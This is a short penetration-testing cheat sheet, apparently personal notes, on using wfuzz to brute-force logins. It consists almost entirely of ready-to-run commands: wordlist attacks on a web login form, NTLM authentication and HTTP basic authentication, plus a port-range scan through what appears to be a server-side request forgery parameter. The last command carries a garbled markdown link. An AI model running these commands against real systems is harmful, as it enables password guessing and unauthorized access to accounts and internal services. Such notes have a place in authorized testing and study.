

---
tags: 🔻 🔻/🃏 Passwords WFUZZ bruteforce
aliases: Hacking Notes
---

# wfuzz

attempt to use wfuzz to bruteforce a password

`wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://x.x.x.x  `
  
• wfuzz NTLM  
  
`wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api`  

  
`wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/Activos/names.txt -z file,/root/Documents/Audits/Activos/names.txt --basic "FUZZ:FUZ2Z" -p x.x.x.x:8080 https://<ip>/api/v1/`  
  
`wfuzz -c -z range,1-65535 --h1=2 [http://](http://10.10.10.55:6000/url.php?path=127.0.0.1:FUZZ%E2%80%8B)x.x.x.x`